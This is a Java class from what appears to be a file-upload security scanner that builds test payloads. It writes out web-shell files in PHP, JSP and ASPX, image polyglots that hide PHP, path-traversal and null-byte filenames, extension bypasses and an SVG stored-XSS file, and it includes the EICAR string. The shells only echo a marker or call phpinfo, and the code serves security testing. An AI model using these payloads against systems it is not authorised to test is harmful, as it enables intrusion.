package com.littlespidy.uploadscanner.engine;

import com.littlespidy.uploadscanner.model.PayloadDefinition;
import com.littlespidy.uploadscanner.model.UploadScannerConfig;

import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;

/**
 * Created with the help of an AI Agent and littlespidy.
 *
 * Generates file upload attack payloads spanning Web Shells, Image Polyglots,
 * Path Traversal, Null Bytes, SVG XSS, and EICAR AV checks.
 *
 * @author littlespidy
 */
public class UploadPayloadGenerator {
    public static final String EXEC_TOKEN = "UPLOAD_SCANNER_EXEC_SUCCESS_";

    /**
     * Generates a curated list of test payloads according to configuration.
     */
    public static List<PayloadDefinition> generatePayloads(UploadScannerConfig config, String baseFilename) {
        List<PayloadDefinition> payloads = new ArrayList<>();
        String token = EXEC_TOKEN + System.currentTimeMillis();

        // 1. Web Shells
        if (config.isTestWebShells()) {
            payloads.add(new PayloadDefinition(
                    "PHP Info Shell",
                    "Web Shell",
                    "upload_test.php",
                    "application/x-php",
                    "<?php echo '" + token + "'; phpinfo(); ?>",
                    token
            ));

            payloads.add(new PayloadDefinition(
                    "PHTML Shell",
                    "Web Shell",
                    "upload_test.phtml",
                    "application/x-phtml",
                    "<?php echo '" + token + "'; ?>",
                    token
            ));

            payloads.add(new PayloadDefinition(
                    "JSP Simple Shell",
                    "Web Shell",
                    "upload_test.jsp",
                    "application/x-jsp",
                    "<% out.println(\"" + token + "\"); %>",
                    token
            ));

            payloads.add(new PayloadDefinition(
                    "ASPX Shell",
                    "Web Shell",
                    "upload_test.aspx",
                    "application/x-aspx",
                    "<%@ Page Language=\"C#\" %><% Response.Write(\"" + token + "\"); %>",
                    token
            ));
        }

        // 2. Image Polyglots
        if (config.isTestPolyglots()) {
            // GIF89a + PHP
            String gifPayload = "GIF89a/*\u0000\u0001\u0000\u0001\u0080\u0000\u0000\u0000\u0000\u0000\u00ff\u00ff\u00ff!\u00f9\u0004\u0001\u0000\u0000\u0000\u0000,*/=1; " +
                    "/*\u0000\u0000\u0000\u0000\u0001\u0000\u0001\u0000\u0000\u0002\u0002D\u0001\u0000; " +
                    "*/\n<?php echo '" + token + "'; ?>";
            payloads.add(new PayloadDefinition(
                    "GIF89a Polyglot",
                    "Polyglot",
                    "avatar_polyglot.gif",
                    "image/gif",
                    gifPayload,
                    token
            ));

            // PNG Header + PHP
            byte[] pngHeader = new byte[] {
                    (byte) 0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A,
                    0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52,
                    0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01,
                    0x08, 0x06, 0x00, 0x00, 0x00, 0x1F, 0x15, (byte) 0xC4, (byte) 0x89
            };
            byte[] phpSnippet = ("\n<?php echo '" + token + "'; ?>").getBytes(StandardCharsets.UTF_8);
            byte[] pngPayload = new byte[pngHeader.length + phpSnippet.length];
            System.arraycopy(pngHeader, 0, pngPayload, 0, pngHeader.length);
            System.arraycopy(phpSnippet, 0, pngPayload, pngHeader.length, phpSnippet.length);

            payloads.add(new PayloadDefinition(
                    "PNG Polyglot",
                    "Polyglot",
                    "avatar_polyglot.png",
                    "image/png",
                    pngPayload,
                    token
            ));
        }

        // 3. Path Traversal
        if (config.isTestPathTraversal()) {
            payloads.add(new PayloadDefinition(
                    "Path Traversal (../../)",
                    "Path Traversal",
                    "../../traversal_shell.php",
                    "application/x-php",
                    "<?php echo '" + token + "'; ?>",
                    token
            ));

            payloads.add(new PayloadDefinition(
                    "URL-encoded Traversal (%2e%2e%2f)",
                    "Path Traversal",
                    "%2e%2e%2f%2e%2e%2ftraversal_shell.php",
                    "application/x-php",
                    "<?php echo '" + token + "'; ?>",
                    token
            ));
        }

        // 4. Extension & MIME Bypass
        if (config.isTestExtensionBypasses()) {
            payloads.add(new PayloadDefinition(
                    "Double Extension (.php.jpg)",
                    "Extension Bypass",
                    "test_bypass.php.jpg",
                    "image/jpeg",
                    "<?php echo '" + token + "'; ?>",
                    token
            ));

            payloads.add(new PayloadDefinition(
                    "Mixed Case (.PhP)",
                    "Extension Bypass",
                    "test_bypass.PhP",
                    "application/x-php",
                    "<?php echo '" + token + "'; ?>",
                    token
            ));

            payloads.add(new PayloadDefinition(
                    "Trailing Dot (.php.)",
                    "Extension Bypass",
                    "test_bypass.php.",
                    "application/x-php",
                    "<?php echo '" + token + "'; ?>",
                    token
            ));

            payloads.add(new PayloadDefinition(
                    "Null Byte (.php%00.png)",
                    "Extension Bypass",
                    "test_bypass.php%00.png",
                    "image/png",
                    "<?php echo '" + token + "'; ?>",
                    token
            ));
        }

        // 5. SVG XSS
        if (config.isTestSvgXss()) {
            String svg = "<?xml version=\"1.0\" standalone=\"no\"?>\n" +
                    "<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n" +
                    "<svg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\">\n" +
                    "   <polygon id=\"triangle\" points=\"0,0 0,50 50,0\" fill=\"#009900\" stroke=\"#004400\"/>\n" +
                    "   <script type=\"text/javascript\">\n" +
                    "      alert('" + token + "');\n" +
                    "   </script>\n" +
                    "</svg>";
            payloads.add(new PayloadDefinition(
                    "SVG Stored XSS",
                    "Client-Side XSS",
                    "vector.svg",
                    "image/svg+xml",
                    svg,
                    token
            ));
        }

        // 6. EICAR Standard Anti-Virus Test File
        if (config.isTestEicar()) {
            String eicar = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
            payloads.add(new PayloadDefinition(
                    "EICAR Anti-Virus Test",
                    "AV Check",
                    "eicar.com.txt",
                    "text/plain",
                    eicar,
                    "EICAR"
            ));
        }

        return payloads;
    }
}
